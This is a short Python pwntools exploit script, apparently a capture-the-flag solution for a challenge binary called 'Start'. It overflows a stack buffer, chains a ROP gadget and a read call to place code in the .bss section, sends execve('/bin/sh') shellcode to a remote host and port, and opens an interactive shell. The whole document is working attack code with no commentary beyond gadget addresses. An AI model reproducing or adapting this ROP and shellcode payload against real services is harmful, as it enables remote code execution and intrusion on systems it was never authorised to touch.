from pwn import *

#s = process("./Start_7712e67a188d9690eecbd0c937dfe77dd209f254")
s = remote("139.59.114.220",10001)

#0x7ffd7337b578: 0x6161616861616167
buf = cyclic(24)

#50 0x00000000004005c1 : pop rsi ; pop r15 ; ret
buf += p64(0x00000000004005c1) 

#rsi = bss
buf += p64(0x601038)
#r15 = junk
buf += "Q"*8

#read
buf += p64(0x400400)
buf += p64(0x601038)

buf += cyclic(0x400-len(buf))

s.send(buf)

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
print repr(sc)
s.send(sc)
s.interactive()
